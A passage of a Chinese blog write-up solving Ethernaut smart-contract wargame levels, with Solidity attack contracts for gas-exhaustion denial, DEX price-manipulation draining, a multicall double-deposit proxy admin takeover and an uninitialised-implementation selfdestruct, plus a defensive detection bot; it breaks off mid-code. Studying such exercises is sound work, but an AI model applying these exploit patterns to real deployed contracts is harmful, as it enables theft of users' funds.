转账，而不向 <code>owner</code> 转账。显然，我们要在接收转账的合约的 <code>fallback()</code> 里做手脚。</p><p>首先，直接 <code>revert()</code> 让交易中断显然不行。因此，我们只能让 <code>fallback()</code> 消耗完所有的 <code>gas</code>，从而使转账成功，但没有 <code>gas</code> 继续执行下一次转账。</p><p>最简单的方式显然是直接写一个死循环。 </p><h3 id="实现-7"><a href="#实现-7" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract pass&#123;<br>    Denial denial;<br><br>    constructor(Denial _denial) &#123;<br>        denial = _denial;<br>        denial.setWithdrawPartner(address(this));<br>    &#125;<br><br>    fallback() external payable &#123; <br>        while (true) &#123;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="21-Shop"><a href="#21-Shop" class="headerlink" title="21. Shop"></a>21. Shop</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>和之前的电梯有异曲同工之处。要求第一次调用 <code>price()</code> 返回100以上的数，第二次返回以下的数。由于是 <code>view</code>，无法像电梯一样设一个 <code>count</code>。注意到原合约中有变量 <code>isSold</code> 在两次调用期间发生了变化。</p><h3 id="实现-8"><a href="#实现-8" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract pass &#123;<br>    Shop shop;<br>    constructor(Shop _shop) &#123;<br>        shop = _shop;<br>    &#125;<br>    <br>    function price() external view returns (uint256) &#123;<br>        if (!shop.isSold())   return 100;<br>        else    return 0;<br><br>    &#125;<br><br>    function beLower() public &#123;<br>        shop.buy();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="22-Dex"><a href="#22-Dex" class="headerlink" title="22. Dex"></a>22. Dex</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>发现本合约的 <code>swapPrice</code> 存在一点问题。当你在两种 <code>token</code> 间反复转换使，会使合约拥有的 <code>token</code> 数量减少。具体过程如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">me</span> =&gt; contract amount<br><span class="hljs-attribute">contract</span> =&gt; me amount*to/from<br><br><br><span class="hljs-attribute">0</span>token <span class="hljs-number">1</span>token2<br><span class="hljs-attribute">me</span><span class="hljs-number">10</span><span class="hljs-number">10</span><br><span class="hljs-attribute">contract</span><span class="hljs-number">100</span><span class="hljs-number">100</span><br><br><span class="hljs-attribute">1</span><span class="hljs-number">1</span> =&gt; <span class="hljs-number">2</span><br><span class="hljs-attribute">me</span><span class="hljs-number">0</span><span class="hljs-number">20</span><br><span class="hljs-attribute">contract</span><span class="hljs-number">110</span><span class="hljs-number">90</span><br><br><span class="hljs-attribute">2</span><span class="hljs-number">2</span> =&gt; <span class="hljs-number">1</span><br><span class="hljs-attribute">me</span><span class="hljs-number">24</span><span class="hljs-number">0</span><br><span class="hljs-attribute">contract</span><span class="hljs-number">86</span><span class="hljs-number">110</span><br><br><span class="hljs-attribute">3</span><span class="hljs-number">1</span> =&gt; <span class="hljs-number">2</span><br><span class="hljs-attribute">me</span><span class="hljs-number">0</span><span class="hljs-number">30</span><br><span class="hljs-attribute">contract</span><span class="hljs-number">110</span><span class="hljs-number">80</span><br><br><span class="hljs-attribute">4</span> <span class="hljs-number">2</span> =&gt; <span class="hljs-number">1</span><br><span class="hljs-attribute">me</span><span class="hljs-number">41</span><span class="hljs-number">0</span><br><span class="hljs-attribute">contract</span><span class="hljs-number">69</span>   <span class="hljs-number">110</span><br><br><span class="hljs-attribute">5</span><span class="hljs-number">1</span> =&gt; <span class="hljs-number">2</span><br><span class="hljs-attribute">me</span><span class="hljs-number">0</span><span class="hljs-number">65</span><br><span class="hljs-attribute">contract</span><span class="hljs-number">110</span><span class="hljs-number">45</span><br><br><span class="hljs-attribute">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="hljs-attribute">6</span><span class="hljs-number">2</span> =&gt; <span class="hljs-number">1</span><br><span class="hljs-attribute">me</span><span class="hljs-number">158</span><span class="hljs-number">0</span><br><span class="hljs-attribute">contract</span>-??<span class="hljs-number">110</span><br><span class="hljs-attribute">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><br><span class="hljs-attribute">6</span> <span class="hljs-number">2</span> =&gt; <span class="hljs-number">1</span><br><span class="hljs-attribute">me</span><span class="hljs-number">110</span>x / <span class="hljs-number">45</span><span class="hljs-number">65</span> - x<br><span class="hljs-attribute">contract</span><span class="hljs-number">110</span> - <span class="hljs-number">110</span>x / <span class="hljs-number">45</span><span class="hljs-number">45</span> + x<br><br><span class="hljs-attribute">x</span> = <span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><h3 id="实现-9"><a href="#实现-9" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface IDex &#123;    <br>    function token1() external view returns(address);<br>    function token2() external view returns(address);<br>    function swap(address from, address to, uint256 amount) external;<br>    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);<br>    function approve(address spender, uint256 amount) external;<br>    function balanceOf(address token, address account) external view returns (uint256);<br>&#125;<br><br>interface IERC20 &#123;<br>    function approve(address sender, uint256 amount) external;<br>    function transferFrom(address from, address to, uint256 amount) external;<br>    function balanceOf(address) external returns(uint256);<br>&#125;<br><br>contract psss &#123;<br>    IDex dex;<br>    IERC20 immutable token1;<br>    IERC20 immutable token2;<br><br>    constructor(IDex _dex) &#123;<br>        dex = _dex;<br>        token1 = IERC20( dex.token1() );<br>        token2 = IERC20( dex.token2() );<br>    &#125;<br><br>    function turnToZero() public &#123;<br>        // 把属于钱包的 token 转给合约，让它操作<br>        token1.transferFrom(msg.sender, address(this), 10);<br>        token2.transferFrom(msg.sender, address(this), 10);<br><br>        token1.approve(address(dex), 10000);<br>        token2.approve(address(dex), 10000);<br><br>        _swap(token1, token2);<br>        _swap(token2, token1);<br>        _swap(token1, token2);<br>        _swap(token2, token1);<br>        _swap(token1, token2);<br>        <br>        dex.swap(address(token2), address(token1), 45);<br><br>        assert(dex.balanceOf(address(token1), address(dex)) == 0);<br>    &#125;<br><br>    // 调用 dex 的 swap()，把本合约的 from 全部转为 to<br>    function _swap(IERC20 from, IERC20 to) internal &#123;<br>        dex.swap(address(from), address(to), from.balanceOf(address(this)));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先获取 <code>token1</code> 和 <code>token2</code> 的地址，分别都给我们的 <code>pass</code> 合约 <code>approve</code> 一点额度，然后再调用 <code>turnToZero()</code>，否则前两行会无法执行。</p><h2 id="23-Dex2"><a href="#23-Dex2" class="headerlink" title="23. Dex2"></a>23. Dex2</h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>与 <code>Dex</code> 对比，显然，交换时缺少了判断 <code>require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</code>，这意味着我们可以用自定义的 <code>ERC20</code> 代币作为 <code>from</code> 来进行交换。</p><h3 id="实现-10"><a href="#实现-10" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br>import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol&quot;;<br>import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol&quot;;<br><br>interface IDex2 &#123;    <br>    function token1() external view returns(address);<br>    function token2() external view returns(address);<br>    function swap(address from, address to, uint256 amount) external;<br>    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);<br>    function approve(address spender, uint256 amount) external;<br>    function balanceOf(address token, address account) external view returns (uint256);<br>&#125;<br><br>contract customizedToken is ERC20&#123;<br><br>    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol)&#123;&#125;<br><br>    function mint(address who, uint256 amount) public &#123;<br>        _mint(who, amount);<br>    &#125;<br>&#125;<br><br>contract pass &#123;<br><br>    IDex2 private immutable dex2;<br>    customizedToken private immutable token;<br>    IERC20 private immutable token1;<br>    IERC20 private immutable token2;<br><br>    constructor(IDex2 _dex2, customizedToken _token, IERC20 _token1, IERC20 _token2) &#123;<br>        dex2 = _dex2;<br>        token = _token;<br>        token1 = _token1;<br>        token2 = _token2;<br>        owner = msg.sender;<br>    &#125;<br><br>    function turnToZero() public &#123;<br>        <br>        token.approve(address(dex2), 10000);<br>        token1.approve(address(dex2), 10000);<br>        token2.approve(address(dex2), 10000);<br>        <br>        token.mint(address(this), 10000);<br><br>        token.mint(address(dex2), 100);<br>        swap(token1, 100);<br>        swap(token2, 200);<br><br>        require( dex2.balanceOf(address(token1), address(dex2)) == 0, &quot;token1 is not zero&quot;);<br>        require( dex2.balanceOf(address(token2), address(dex2)) == 0, &quot;token2 is not zero&quot;);<br>    &#125;<br><br>    function swap(IERC20 to, uint256 amount) public &#123;<br>        dex2.swap(address(token), address(to), amount);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>分析一下。</p><p>初始是这样的：<br>|      | token1 | token2 | token |<br>| :—: | :——: | :——: | :—-: |<br>| dex2 |  100   |  100   |  100  |<br>| pass |   0    |   0    | 10000 |</p><p>第一次交换后：<br>|      | token1 | token2 | token |<br>| :—: | :——: | :——: | :—-: |<br>| dex2 |   0    |  100   |  200  |<br>| pass |  100   |   0    | 19800 |</p><p>那么设这次交换的 <code>amount = x</code>，有 ${SwapPrice} = \frac {100x} {200} = 100$，因此第二次交换就是200个。</p><h2 id="24-Puzzle-Wallet"><a href="#24-Puzzle-Wallet" class="headerlink" title="24. Puzzle Wallet"></a>24. Puzzle Wallet</h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>首先，需要大致了解代理合约的逻辑。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// Proxy：存储状态变量，逻辑部分地址，通过 fallback 将所有函数引导到逻辑部分去<br>contract Proxy&#123;<br>address public impl;<br>address public admin;<br><br>constructor(address _impl, address _admin) &#123;<br>impl = _impl;<br>        admin = _admin;<br>&#125;<br><br>/** <br> *  admin, Logic 相关设置 <br>**/<br><br>fallback() external payable&#123;<br>/**<br> * 调用 Logic 中的同名函数 <br>**/<br>&#125;<br>&#125;<br><br>contract Logic&#123;<br>address public impl;<br>address public admin;<br>// Logic 自己的变量<br><br>/**<br> * 各种实际功能<br>**/<br>&#125;<br></code></pre></td></tr></table></figure><p>显然无法在 <code>Proxy</code> 中直接更改。观察发现，合约 <code>PuzzleWallet</code> 中状态变量未与 <code>Proxy</code> 对齐，因此可以通过修改 <code>maxBalance</code> 来修改 <code>admin</code>。要修改 <code>maxBalance</code> 要调用 <code>setMaxBalance()</code> 函数，因此必须先把自己加入白名单。<code>addToWhitelist()</code> 函数要求 <code>msg.sender == owner</code>，</p><p>因此可以修改 <code>pendingAdmin</code> 来实现。显然，想要修改 <code>maxBalance</code>，必须先取出合约里的 ETH。</p><p>显然，<code>deposit()</code> 可以修改 <code>balances[msg.sender]</code>，同时我们注意到有 <code>multicall()</code>，这或许可以实现存入一次钱，但执行两次 <code>balances[msg.sender] += msg.value</code>。</p><p>显然，<code>if</code> 中的语句让我们调用一次 <code>multicall()</code> 最多 <code>delegatecall deposit()</code> 一次。但这可以通过递归调用避开，即第一次的 <code>selector</code> 是 <code>deposit()</code> 的，但第二次是 <code>multicall()</code> 的。这样，在第二次调用 <code>multicall()</code> 时，<code>depositCalled</code> 会被更新为 false，只要给它的参数传入 <code>deposit()</code> 的 <code>selector</code> 即可。</p><p>部署一下，发现原合约有0.001个 ETH，因此传入 0.001 ETH（1 finney），按上述方法调用，再取出，修改 <code>maxBalance</code> 即可。</p><h3 id="实现-11"><a href="#实现-11" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>interface IPuzzleWallet &#123;<br>    function pendingAdmin() external view returns(address);<br>    function admin() external view returns(address);<br>    function proposeNewAdmin(address _newAdmin) external;<br>    function approveNewAdmin(address _expectedAdmin) external;<br><br>    function owner() external view returns(address);<br>    function maxBalance() external view returns(uint256);<br>    function whitelisted(address) external view returns(bool);<br>    function balances(address) external view returns(uint256);<br><br>    function init(uint256 _maxBalance) external;<br>    function setMaxBalance(uint256 _maxBalance) external;<br>    function addToWhitelist(address addr) external;<br>    function deposit() external payable;<br>    function execute(address to, uint256 value, bytes calldata data) external payable;<br>    function multicall(bytes[] calldata data) external payable;<br>&#125;<br><br>contract pass&#123;<br>    IPuzzleWallet public wallet;<br><br>    constructor(IPuzzleWallet _wallet) payable&#123;<br>        wallet = _wallet;<br>    &#125;<br><br>    function beAdmin() public &#123;<br>        wallet.proposeNewAdmin(address(this));<br>        wallet.addToWhitelist(address(this));<br><br>        bytes[] memory data0 = new bytes[](1);<br>        data0[0] = abi.encodeWithSelector(wallet.deposit.selector);<br><br>        bytes[] memory data = new bytes[](2);<br>        // 第一次调用 deposit()<br>        data[0] = abi.encodeWithSelector(wallet.deposit.selector);<br>        // 第二次调用 multicall(), 参数为：长度为1的bytes数组，deposit() 的函数选择器<br>        data[1] = abi.encodeWithSelector(wallet.multicall.selector, data0);<br><br>        wallet.multicall&#123;value: 0.001 ether&#125;(data);<br><br>        wallet.execute(msg.sender, 0.002 ether, &quot;&quot;);<br>        wallet.setMaxBalance( uint256(uint160(msg.sender)) );<br><br>        require( msg.sender == wallet.admin() );<br>    &#125;<br><br>    function transfer(address to, uint256 _value) public &#123;<br>        require(_value &lt;= address(this).balance );<br>        (bool success,) = to.call&#123;value:_value&#125;(&quot;&quot;);<br>        require(success);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="25-Motorbike"><a href="#25-Motorbike" class="headerlink" title="25. Motorbike"></a>25. Motorbike</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>首先，该关卡在现在已经 <strong>不可能</strong> 通过预期方式完成。主要原因是，EIP-6780：仅在同一交易中自毁，对 <code>selfdestruct()</code> 进行了语义更改，使它仅在同一笔交易中，既创建合约A，又自毁合约A时，才会真正销毁它，否则仅会转出所有 ETH。因此，现在无论我们怎么 <code>selfdestruct</code>，能做到的仅是转出 ETH（并且本来就没有），而非销毁 <code>Engine</code> 合约。</p><p>此外，github 上有人给出了一种可行的解法：<a href="https://github.com/Ching367436/ethernaut-motorbike-solution-after-decun-upgrade/?tab=readme-ov-file">Ethernaut Motorbike Solution (After Dencun Upgrade)</a>。该解法的思路大致为：自己写一个函数，调用ethernaut里创建新实例的函数，为自己创建实例，并在该函数中自行计算出该实例的地址，并销毁它，然后再返回页面提交实例。</p><p>以下给出升级前的解法。</p><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>很显然，这又是一份可升级合约。题目要求可解释为：将 <code>Engine</code> 合约升级为另一个合约，然后 <code>selfdestruct</code> 它。显然，有两种方法可以实现升级。</p><p>其一，通过 <code>Motorbike</code> 去 <code>delegatecall upgradeToAndCall()</code>。但由于在构造函数中已经 <code>delegatecall</code> 了 <code>intialize()</code>，这使得 <code>Motorbike</code> 中，<code>slot[0]部分:upgrader = openzepplin, slot[1]:horsePower = 1000</code>（可以通过<code>await web3.eth.getStorageAt (&quot;$&#123;实例地址&#125;&quot;, 1)</code> 确认）。因此只有 openzepplin 可以这样升级合约。</p><p>其二，直接更改 <code>Engine</code> 合约。根据 EIP-1967，在槽：_IMPLEMENTATION_SLOT 处存储了逻辑合约的地址。通过<code>await web3.eth.getStorageAt (&quot;$&#123;实例地址&#125;&quot;, &quot;$&#123;_IMPLEMENTATION_SLOT&#125;&quot;)</code> 可以获得逻辑合约地址。由于构造函数的 <code>initialize()</code> 使用了 <code>Motorbike</code> 的上下文，<code>Engine</code> 合约事实上并没有被初始化。这样就可以将 <code>Engine</code> 合约的 <code>upgrader</code> 设为我们自己，然后将 <code>Engine</code> 合约认为的新的 <code>implementation</code> 设为我们的合约，并同时调用其中的 <code>selfdestruct()</code> 函数。</p><h3 id="理论实现"><a href="#理论实现" class="headerlink" title="理论实现"></a>理论实现</h3><p>由于已经无法实现，该方法仅是一个理论上的猜想。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br><br>pragma solidity &lt;0.7.0;<br><br>interface IEngine&#123;<br>    function upgrader() external view returns(address);<br>    function horsePower() external view returns(uint256);<br>    function initialize() external;<br>    function upgradeToAndCall(address,bytes memory) external payable;<br>&#125;<br><br>// 0x24eDA2a39f136dd2a1c8EA957D8a92B3254C7b63<br>contract pass &#123;<br>    IEngine engine;<br>    constructor(IEngine _engine) public &#123;<br>        engine = _engine;<br>    &#125;<br><br>    function destroy() public &#123;<br>        engine.initialize();<br>        engine.upgradeToAndCall(address(this), abi.encodeWithSignature(&quot;brokenEngine()&quot;));<br>    &#125;<br><br>    function brokenEngine() public &#123;<br>        selfdestruct(msg.sender);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="26-Double-Entry-Ponit"><a href="#26-Double-Entry-Ponit" class="headerlink" title="26. Double Entry Ponit"></a>26. Double Entry Ponit</h2><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p>这关的介绍很复杂，大致应该是： <code>CryptoVault</code> 的代币由 <code>LegacyToken</code> 更新为 <code>DoubleEntryPoint</code>（同时也是 <code>underlying</code> 底层代币），但现在的金库合约有 bug，我们需要编写一个 <code>fortaBot</code>，在异常时及时 <code>revert</code>。</p><p>这关的合约很多很乱，我们要先分清楚各个合约的地址：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Addresses">Contract DoubleEntryPoint ----------&gt; 0x00Fd7896bEf30fC25a4AF46Bf38d726711b69200 -&gt; 实例(DET)<br>|- cryptoVault0x68487b1C931c4fd4552AA0bCcCF2963857925364-&gt; Contract CryptoVault<br>|- player自己<br>|- delegatedFrom0x525309Dd998cD06EE7a0680944f59D35fe511CA3-&gt; Contract LGT<br>|- forta0x56cAFA11F403FB113377Fc311F1bd3b1e242F6e0-&gt; Contarct forta<br> <br>Contract LegacyToken ----------&gt; 0x525309Dd998cD06EE7a0680944f59D35fe511CA3<br>|- delegate0x00Fd7896bEf30fC25a4AF46Bf38d726711b69200-&gt; Contract DET<br><br>Contract CryptoVault ----------&gt; 0x68487b1C931c4fd4552AA0bCcCF2963857925364<br>|- sweptTokensRecipient自己<br>|- underlying0x00Fd7896bEf30fC25a4AF46Bf38d726711b69200<br></code></pre></td></tr></table></figure></p><p>这样问题就很明显了。当我们调用 <code>CryptoVault</code> 合约的 <code>sweepToken(address LGT)</code> 时，它会调用 <code>LGT</code> 合约的 <code>transfer()</code>，然后调用 <code>delegate.delegateTransfer()</code>，而由于 <code>delegate</code> 就是 DET，这次转账又会交给 DET 合约的 <code>delegateTransfer()</code>，并最终直接调用 ERC 20 代币底层的 <code>_transfer(origSender(就是 from), to, value)</code>，而这个函数不会检查任何授权，只要金额充足，地址无误，就会即刻转账。最后结果就是底层代币会被全部转走。</p><p>因此，我们要设计一个 bot，它可以拦截这样的交易。在我们预期中，<code>cryptoVault</code> 应该永远不会去调用 <code>DET</code> 的转账函数（因为 DET 是底层代币，不会被转出）即：<code>origSender</code> 永远不会是 <code>cryptoVault</code>。因此，我们根据这一点进行拦截。</p><p>在这个继承自 <code>IDetectionBot</code> 的 bot 中，我们需要从 <code>msgData</code> 中解析出 <code>origSender</code>，并在 <code>origSender == address(cryptoVault)</code> 时，调用已部署的 <code>forta</code> 的 <code>raiseAlert(user)</code>。传入的 <code>msgData</code> 就是 <code>msg.data</code>（完整的 <code>calldata</code>），它的前四字节是函数签名：<code>bytes4( keccak256(&quot;delegateTransfer(address,uint256,address)&quot;) )</code>，后面就是参数。可以通过 <code>abi.decode( $&#123;msg.data&#125;, ($&#123;像签名一样列举参数类型&#125;) )</code> 获取。</p><h3 id="实现-12"><a href="#实现-12" class="headerlink" title="实现"></a>实现</h3><p>由于出现了一点小问题，实现中的地址和分析里的不一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;<br><br>interface IDetectionBot &#123;<br>    function handleTransaction(address user, bytes calldata msgData) external;<br>&#125;<br><br>interface IForta &#123;<br>    function usersDetectionBots(address user) external view returns(address bot);<br>    function setDetectionBot(address detectionBotAddress) external;<br>    function notify(address user, bytes calldata msgData) external;<br>    function raiseAlert(address user) external;<br>&#125;<br><br>interface ILegacyToken&#123;<br>    function delegate() external view returns(address delegate);<br>&#125;<br><br>interface ICryptoVault&#123;<br>    function sweptTokensRecipient() external view returns(address sweptTokensRecipient);<br>    function underlying() external view returns(address underlying);<br>    function sweepToken(IERC20 token) external;<br>&#125;<br><br>contract bot is IDetectionBot&#123;<br>    IForta public constant forta = IForta(0x61d2912e92b92f1b8CEdb937FbC6a299e4279fd1);<br>    ICryptoVault public vault = ICryptoVault(0x27590856b20e58EA0b412D8D3b83ac589cc72Dab);<br><br>    //                             player          msg.data<br>    function handleTransaction(address user, bytes calldata msgData) external override &#123;<br>        address payable to;<br>        address payable originSender;<br>        address payable _vault = payable(address(vault));<br>        uint256 value;<br>        (to, value, originSender) = abi.decode(msgData[4:], (address, uint256, address));<br>        if (originSender == _vault) &#123;<br>            forta.raiseAlert(user);<br>        &#125;<br>    